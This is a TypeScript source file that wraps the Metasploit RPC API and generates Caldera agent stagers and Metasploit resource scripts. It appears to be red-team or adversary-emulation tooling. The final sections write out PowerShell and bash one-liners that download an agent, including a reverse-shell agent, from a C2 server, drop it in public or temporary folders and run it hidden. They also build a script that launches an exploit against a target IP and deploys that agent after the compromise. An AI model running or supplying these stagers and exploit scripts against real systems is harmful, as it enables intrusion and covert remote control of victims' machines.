/**
 * Metasploit MSGRPC API Client
 *
 * Provides a typed interface to the Metasploit RPC API for:
 * - Authentication (login/logout/token management)
 * - Module search, info, and execution
 * - Session management (list, interact, terminate)
 * - Job monitoring
 * - Console interaction
 *
 * Uses MessagePack RPC protocol (native msfrpcd protocol).
 * Supports SSH tunnel mode for secure connectivity.
 *
 * Connection details can come from:
 * 1. ENV vars (MSF_RPC_HOST, etc.) for a static instance
 * 2. Per-server config from the metasploitServers DB table
 * 3. SSH tunnel (localhost:tunnelPort → remote:55553)
 */

import { ENV } from "../_core/env";
import { Packr, Unpackr } from "msgpackr";
import { tunnelManager, createTunnelForServer } from "./ssh-tunnel-manager";

// MessagePack encoder/decoder configured for Ruby compatibility
const packr = new Packr({ useRecords: false });
const unpackr = new Unpackr({ useRecords: false, mapsAsObjects: false });

// ─── Types ─────────────────────────────────────────────────────────────────

export interface MsfConnectionConfig {
  host: string;
  port: number;
  user: string;
  pass: string;
  ssl: boolean;
  token?: string;
}

export interface MsfRpcResponse {
  result?: any;
  error?: string;
  error_code?: number;
  error_message?: string;
}

export interface MsfModule {
  type: string;
  name: string;
  fullname: string;
  rank: string;
  disclosuredate?: string;
  description?: string;
  references?: string[];
  authors?: string[];
}

export interface MsfModuleInfo {
  name: string;
  description: string;
  license: string;
  filepath: string;
  version: string;
  rank: number;
  references: string[];
  authors: string[];
  targets?: Array<{ id: number; name: string }>;
  options?: Record<string, MsfModuleOption>;
}

export interface MsfModuleOption {
  type: string;
  required: boolean;
  advanced: boolean;
  evasion: boolean;
  desc: string;
  default?: any;
  enums?: string[];
}

export interface MsfSession {
  type: string;           // "shell" | "meterpreter"
  tunnel_local: string;
  tunnel_peer: string;
  via_exploit: string;
  via_payload: string;
  desc: string;
  info: string;
  workspace: string;
  target_host: string;
  username: string;
  uuid: string;
  exploit_uuid: string;
  routes: string[];
  arch?: string;
  platform?: string;
}

export interface MsfJob {
  jid: number;
  name: string;
  start_time: number;
  datastore?: Record<string, any>;
}

export interface MsfVersion {
  version: string;
  ruby: string;
  api: string;
}

export interface MsfExploitResult {
  job_id: number;
  uuid?: string;
}

// ─── MSF RPC Client Class ─────────────────────────────────────────────────

export class MsfClient {
  private config: MsfConnectionConfig;
  private requestId = 0;
  private token: string | null = null;

  constructor(config: MsfConnectionConfig) {
    this.config = config;
    if (config.token) {
      this.token = config.token;
    }
  }

  /**
   * Create a client from ENV vars (global MSF instance).
   */
  static fromEnv(): MsfClient | null {
    if (!ENV.MSF_RPC_HOST) return null;
    return new MsfClient({
      host: ENV.MSF_RPC_HOST,
      port: ENV.MSF_RPC_PORT,
      user: ENV.MSF_RPC_USER,
      pass: ENV.MSF_RPC_PASS,
      ssl: ENV.MSF_RPC_SSL,
    });
  }

  /**
   * Create a client from a server config record.
   */
  static fromServerConfig(server: {
    id?: number;
    ipAddress: string | null;
    rpcPort: number | null;
    rpcUser: string | null;
    rpcPass: string | null;
    rpcSsl: boolean | null;
    rpcToken: string | null;
    sshTunnelEnabled?: boolean | null;
    sshUser?: string | null;
    sshKeyPath?: string | null;
  }): MsfClient | null {
    if (!server.ipAddress) return null;
    return new MsfClient({
      host: server.ipAddress,
      port: server.rpcPort || 55553,
      user: server.rpcUser || "msf",
      pass: server.rpcPass || "",
      ssl: server.rpcSsl ?? false,
      token: server.rpcToken || undefined,
    });
  }

  /**
   * Create a tunnel-aware client for an exploit server.
   * Establishes SSH tunnel first, then connects via localhost.
   */
  static async fromServerWithTunnel(server: {
    id: number;
    ipAddress: string | null;
    rpcPort: number | null;
    rpcUser: string | null;
    rpcPass: string | null;
    rpcSsl: boolean | null;
    rpcToken: string | null;
    sshTunnelEnabled?: boolean | null;
    sshUser?: string | null;
    sshKeyPath?: string | null;
  }): Promise<MsfClient | null> {
    if (!server.ipAddress) return null;

    const tunnelId = `msf-tunnel-${server.id}`;
    let host = server.ipAddress;
    let port = server.rpcPort || 55553;

    // If tunnel is enabled, establish SSH tunnel first
    if (server.sshTunnelEnabled !== false) {
      const existingPort = tunnelManager.getLocalPort(tunnelId);
      if (existingPort && tunnelManager.isConnected(tunnelId)) {
        host = "127.0.0.1";
        port = existingPort;
      } else {
        const result = await createTunnelForServer({
          id: server.id,
          ipAddress: server.ipAddress,
          rpcPort: server.rpcPort,
          sshUser: server.sshUser,
          sshKeyPath: server.sshKeyPath,
        });
        host = "127.0.0.1";
        port = result.localPort;
      }
    }

    return new MsfClient({
      host,
      port,
      user: server.rpcUser || "msf",
      pass: server.rpcPass || "",
      ssl: false, // No SSL needed through tunnel
      token: server.rpcToken || undefined,
    });
  }

  // ─── Low-Level RPC ────────────────────────────────────────────────────

  private get baseUrl(): string {
    const proto = this.config.ssl ? "https" : "http";
    return `${proto}://${this.config.host}:${this.config.port}`;
  }

  /**
   * Convert Ruby MessagePack binary-key Maps to plain JS objects.
   * Ruby's msgpack encodes string keys as binary (bin type),
   * which msgpackr decodes as Buffer keys in Maps.
   */
  private convertMapToObject(value: any): any {
    if (value instanceof Map) {
      const obj: Record<string, any> = {};
      value.forEach((v: any, k: any) => {
        const key = Buffer.isBuffer(k) ? k.toString("utf8") : String(k);
        obj[key] = this.convertMapToObject(v);
      });
      return obj;
    }
    if (Buffer.isBuffer(value)) {
      return value.toString("utf8");
    }
    if (Array.isArray(value)) {
      return value.map((v) => this.convertMapToObject(v));
    }
    return value;
  }

  /**
   * Send a MessagePack RPC request to the MSF instance.
   * This is the native msfrpcd protocol.
   */
  private async rpc(method: string, params: any[] = []): Promise<any> {
    this.requestId++;

    // MessagePack RPC: [method, ...params] with token prepended
    const callArgs = this.token && !method.startsWith("auth.login")
      ? [method, this.token, ...params]
      : [method, ...params];

    const packed = packr.pack(callArgs);

    try {
      const resp = await fetch(`${this.baseUrl}/api/`, {
        method: "POST",
        headers: {
          "Content-Type": "binary/message-pack",
          "Accept": "binary/message-pack",
        },
        body: packed as any,
        signal: AbortSignal.timeout(30000),
      });

      if (!resp.ok) {
        throw new Error(`MSF RPC HTTP ${resp.status}: ${await resp.text().catch(() => "unknown")}`);
      }

      const buffer = Buffer.from(await resp.arrayBuffer());
      const raw = unpackr.unpack(buffer);
      const data = this.convertMapToObject(raw);

      if (data.error === true || data.error_class) {
        throw new Error(`MSF RPC Error: ${data.error_message || data.error_string || "Unknown error"}`);
      }

      return data;
    } catch (err: any) {
      if (err.name === "TypeError" || err.name === "AbortError") {
        throw new Error(`MSF RPC connection failed (${this.config.host}:${this.config.port}): ${err.message}`);
      }
      throw err;
    }
  }

  // ─── Authentication ───────────────────────────────────────────────────

  /**
   * Authenticate with the MSF RPC service.
   * Returns the auth token on success.
   */
  async login(): Promise<string> {
    const result = await this.rpc("auth.login", [this.config.user, this.config.pass]);
    if (result?.result === "success" && result?.token) {
      this.token = result.token;
      return result.token;
    }
    throw new Error("MSF RPC authentication failed");
  }

  /**
   * Logout and invalidate the current token.
   */
  async logout(): Promise<void> {
    if (!this.token) return;
    try {
      await this.rpc("auth.logout", [this.token]);
    } finally {
      this.token = null;
    }
  }

  /**
   * Check if we have a valid token (auto-login if needed).
   */
  async ensureAuth(): Promise<void> {
    if (this.token) {
      // Test the token with a lightweight call
      try {
        await this.rpc("core.version");
        return;
      } catch {
        // Token expired, re-login
        this.token = null;
      }
    }
    await this.login();
  }

  get currentToken(): string | null {
    return this.token;
  }

  // ─── Core ─────────────────────────────────────────────────────────────

  /**
   * Get MSF version info.
   */
  async getVersion(): Promise<MsfVersion> {
    await this.ensureAuth();
    return this.rpc("core.version");
  }

  /**
   * Get module statistics.
   */
  async getModuleStats(): Promise<Record<string, number>> {
    await this.ensureAuth();
    return this.rpc("core.module_stats");
  }

  // ─── Module Operations ────────────────────────────────────────────────

  /**
   * Search for modules by keyword.
   */
  async searchModules(query: string): Promise<MsfModule[]> {
    await this.ensureAuth();
    const result = await this.rpc("module.search", [query]);
    return Array.isArray(result) ? result : [];
  }

  /**
   * Get detailed info about a module.
   */
  async getModuleInfo(moduleType: string, moduleName: string): Promise<MsfModuleInfo> {
    await this.ensureAuth();
    return this.rpc("module.info", [moduleType, moduleName]);
  }

  /**
   * Get options for a module.
   */
  async getModuleOptions(moduleType: string, moduleName: string): Promise<Record<string, MsfModuleOption>> {
    await this.ensureAuth();
    return this.rpc("module.options", [moduleType, moduleName]);
  }

  /**
   * Get compatible payloads for an exploit module.
   */
  async getCompatiblePayloads(moduleName: string): Promise<string[]> {
    await this.ensureAuth();
    const result = await this.rpc("module.compatible_payloads", [moduleName]);
    return result?.payloads || [];
  }

  /**
   * Run a module check (verify if target is vulnerable).
   */
  async checkModule(moduleType: string, moduleName: string, options: Record<string, any>): Promise<{ job_id: number; uuid: string }> {
    await this.ensureAuth();
    return this.rpc("module.check", [moduleType, moduleName, options]);
  }

  /**
   * Execute a module (exploit, auxiliary, post, or payload).
   */
  async executeModule(
    moduleType: string,
    moduleName: string,
    options: Record<string, any>,
  ): Promise<MsfExploitResult> {
    await this.ensureAuth();
    return this.rpc("module.execute", [moduleType, moduleName, options]);
  }

  /**
   * Get running module statistics.
   */
  async getRunningStats(): Promise<any> {
    await this.ensureAuth();
    return this.rpc("module.running_stats");
  }

  // ─── Session Management ───────────────────────────────────────────────

  /**
   * List all active sessions.
   */
  async listSessions(): Promise<Record<string, MsfSession>> {
    await this.ensureAuth();
    const result = await this.rpc("session.list");
    return result || {};
  }

  /**
   * Stop/kill a session.
   */
  async stopSession(sessionId: string): Promise<void> {
    await this.ensureAuth();
    await this.rpc("session.stop", [sessionId]);
  }

  /**
   * Write to a shell session.
   */
  async shellWrite(sessionId: string, command: string): Promise<number> {
    await this.ensureAuth();
    const result = await this.rpc("session.shell_write", [sessionId, command]);
    return result?.write_count || 0;
  }

  /**
   * Read from a shell session.
   */
  async shellRead(sessionId: string, readPointer?: number): Promise<{ seq: string; data: string }> {
    await this.ensureAuth();
    const params = readPointer ? [sessionId, readPointer] : [sessionId];
    return this.rpc("session.shell_read", params);
  }

  /**
   * Write to a Meterpreter session.
   */
  async meterpreterWrite(sessionId: string, command: string): Promise<void> {
    await this.ensureAuth();
    await this.rpc("session.meterpreter_write", [sessionId, command]);
  }

  /**
   * Read from a Meterpreter session.
   */
  async meterpreterRead(sessionId: string): Promise<string> {
    await this.ensureAuth();
    const result = await this.rpc("session.meterpreter_read", [sessionId]);
    return result?.data || "";
  }

  // ─── Job Management ───────────────────────────────────────────────────

  /**
   * List all running jobs.
   */
  async listJobs(): Promise<Record<string, string>> {
    await this.ensureAuth();
    return this.rpc("job.list");
  }

  /**
   * Get detailed info about a job.
   */
  async getJobInfo(jobId: string): Promise<MsfJob> {
    await this.ensureAuth();
    return this.rpc("job.info", [jobId]);
  }

  /**
   * Stop a running job.
   */
  async stopJob(jobId: string): Promise<void> {
    await this.ensureAuth();
    await this.rpc("job.stop", [jobId]);
  }

  // ─── Console Operations ───────────────────────────────────────────────

  /**
   * Create a new console.
   */
  async createConsole(): Promise<{ id: string; prompt: string; busy: boolean }> {
    await this.ensureAuth();
    return this.rpc("console.create");
  }

  /**
   * Write to a console.
   */
  async consoleWrite(consoleId: string, command: string): Promise<number> {
    await this.ensureAuth();
    const result = await this.rpc("console.write", [consoleId, command]);
    return result?.wrote || 0;
  }

  /**
   * Read from a console.
   */
  async consoleRead(consoleId: string): Promise<{ data: string; prompt: string; busy: boolean }> {
    await this.ensureAuth();
    return this.rpc("console.read", [consoleId]);
  }

  /**
   * Destroy a console.
   */
  async destroyConsole(consoleId: string): Promise<void> {
    await this.ensureAuth();
    await this.rpc("console.destroy", [consoleId]);
  }

  /**
   * List all consoles.
   */
  async listConsoles(): Promise<Record<string, { id: string; prompt: string; busy: boolean }>> {
    await this.ensureAuth();
    return this.rpc("console.list");
  }

  // ─── Health Check ─────────────────────────────────────────────────────

  /**
   * Perform a health check on the MSF instance.
   * Returns version info and module counts if healthy.
   */
  async healthCheck(): Promise<{
    healthy: boolean;
    version?: MsfVersion;
    moduleStats?: Record<string, number>;
    sessionCount?: number;
    jobCount?: number;
    error?: string;
  }> {
    try {
      await this.ensureAuth();
      const [version, stats, sessions, jobs] = await Promise.all([
        this.getVersion(),
        this.getModuleStats(),
        this.listSessions(),
        this.listJobs(),
      ]);

      return {
        healthy: true,
        version,
        moduleStats: stats,
        sessionCount: Object.keys(sessions).length,
        jobCount: Object.keys(jobs).length,
      };
    } catch (err: any) {
      return { healthy: false, error: err.message };
    }
  }
}

// ─── Caldera Agent Stager Generator ────────────────────────────────────────

export interface AgentStager {
  type: "sandcat" | "manx" | "custom";
  platform: "windows" | "linux" | "darwin";
  command: string;
  description: string;
  callbackUrl: string;
}

/**
 * Generate Caldera agent stager commands for embedding in Metasploit payloads.
 * These commands download and execute a Caldera agent that phones home to the C2.
 */
export function generateAgentStagers(calderaUrl: string, group?: string): AgentStager[] {
  const agentGroup = group || "red";
  const stagers: AgentStager[] = [];

  // Sandcat (Go-based agent) — Windows PowerShell
  stagers.push({
    type: "sandcat",
    platform: "windows",
    command: [
      `$server="${calderaUrl}";`,
      `$url="$server/file/download";`,
      `$wc=New-Object System.Net.WebClient;`,
      `$wc.Headers.add("platform","windows");`,
      `$wc.Headers.add("file","sandcat.go");`,
      `$wc.Headers.add("server","$server");`,
      `$wc.Headers.add("group","${agentGroup}");`,
      `$data=$wc.DownloadData($url);`,
      `$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace('"',"");`,
      `[io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data);`,
      `Start-Process -FilePath "C:\\Users\\Public\\$name.exe" -ArgumentList "-server $server -group ${agentGroup}" -WindowStyle Hidden;`,
    ].join(""),
    description: "PowerShell one-liner to download and execute Sandcat agent on Windows",
    callbackUrl: calderaUrl,
  });

  // Sandcat — Linux bash
  stagers.push({
    type: "sandcat",
    platform: "linux",
    command: [
      `server="${calderaUrl}";`,
      `curl -s -X POST $server/file/download `,
      `-H "file:sandcat.go" -H "platform:linux" `,
      `-H "server:$server" -H "group:${agentGroup}" `,
      `-o /tmp/sandcat;`,
      `chmod +x /tmp/sandcat;`,
      `nohup /tmp/sandcat -server $server -group ${agentGroup} &>/dev/null &`,
    ].join(""),
    description: "Bash one-liner to download and execute Sandcat agent on Linux",
    callbackUrl: calderaUrl,
  });

  // Sandcat — macOS
  stagers.push({
    type: "sandcat",
    platform: "darwin",
    command: [
      `server="${calderaUrl}";`,
      `curl -s -X POST $server/file/download `,
      `-H "file:sandcat.go" -H "platform:darwin" `,
      `-H "server:$server" -H "group:${agentGroup}" `,
      `-o /tmp/sandcat;`,
      `chmod +x /tmp/sandcat;`,
      `nohup /tmp/sandcat -server $server -group ${agentGroup} &>/dev/null &`,
    ].join(""),
    description: "Bash one-liner to download and execute Sandcat agent on macOS",
    callbackUrl: calderaUrl,
  });

  // Manx (reverse shell agent) — Windows
  stagers.push({
    type: "manx",
    platform: "windows",
    command: [
      `$server="${calderaUrl}";`,
      `$url="$server/file/download";`,
      `$wc=New-Object System.Net.WebClient;`,
      `$wc.Headers.add("platform","windows");`,
      `$wc.Headers.add("file","manx.go");`,
      `$wc.Headers.add("server","$server");`,
      `$wc.Headers.add("group","${agentGroup}");`,
      `$data=$wc.DownloadData($url);`,
      `$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace('"',"");`,
      `[io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data);`,
      `Start-Process -FilePath "C:\\Users\\Public\\$name.exe" -ArgumentList "-server $server -group ${agentGroup}" -WindowStyle Hidden;`,
    ].join(""),
    description: "PowerShell one-liner to download and execute Manx reverse shell agent on Windows",
    callbackUrl: calderaUrl,
  });

  // Manx — Linux
  stagers.push({
    type: "manx",
    platform: "linux",
    command: [
      `server="${calderaUrl}";`,
      `curl -s -X POST $server/file/download `,
      `-H "file:manx.go" -H "platform:linux" `,
      `-H "server:$server" -H "group:${agentGroup}" `,
      `-o /tmp/manx;`,
      `chmod +x /tmp/manx;`,
      `nohup /tmp/manx -server $server -group ${agentGroup} &>/dev/null &`,
    ].join(""),
    description: "Bash one-liner to download and execute Manx reverse shell agent on Linux",
    callbackUrl: calderaUrl,
  });

  return stagers;
}

/**
 * Generate a Metasploit resource script (.rc) that:
 * 1. Loads the exploit module
 * 2. Sets options (RHOSTS, RPORT, payload)
 * 3. Sets the payload to execute a Caldera agent stager
 * 4. Runs the exploit
 *
 * This can be fed directly to msfconsole -r script.rc
 */
export function generateMsfResourceScript(params: {
  exploitModule: string;
  targetIp: string;
  targetPort?: number;
  payloadModule?: string;
  calderaUrl: string;
  calderaGroup?: string;
  lhost: string;          // Attacker's IP (exploit server)
  lport?: number;
  additionalOptions?: Record<string, string>;
}): string {
  const {
    exploitModule,
    targetIp,
    targetPort,
    payloadModule,
    calderaUrl,
    calderaGroup = "red",
    lhost,
    lport = 4444,
    additionalOptions = {},
  } = params;

  const lines: string[] = [
    `# Auto-generated Metasploit resource script`,
    `# Target: ${targetIp}${targetPort ? `:${targetPort}` : ""}`,
    `# Exploit: ${exploitModule}`,
    `# Generated: ${new Date().toISOString()}`,
    ``,
    `use ${exploitModule}`,
    `set RHOSTS ${targetIp}`,
  ];

  if (targetPort) lines.push(`set RPORT ${targetPort}`);

  // Set payload
  if (payloadModule) {
    lines.push(`set PAYLOAD ${payloadModule}`);
  }

  lines.push(`set LHOST ${lhost}`);
  lines.push(`set LPORT ${lport}`);

  // Additional options
  for (const [key, value] of Object.entries(additionalOptions)) {
    lines.push(`set ${key} ${value}`);
  }

  // Add post-exploitation command to deploy Caldera agent
  const stagerCmd = [
    `server="${calderaUrl}";`,
    `curl -s -X POST $server/file/download `,
    `-H "file:sandcat.go" -H "platform:linux" `,
    `-H "server:$server" -H "group:${calderaGroup}" `,
    `-o /tmp/sandcat && chmod +x /tmp/sandcat && `,
    `nohup /tmp/sandcat -server $server -group ${calderaGroup} &>/dev/null &`,
  ].join("");

  lines.push(``);
  lines.push(`# Post-exploitation: Deploy Caldera agent`);
  lines.push(`set AutoRunScript "multi_console_command -cl 'shell','${stagerCmd}'"`);
  lines.push(``);
  lines.push(`# Execute`);
  lines.push(`exploit -j`);
  lines.push(``);

  return lines.join("\n");
}
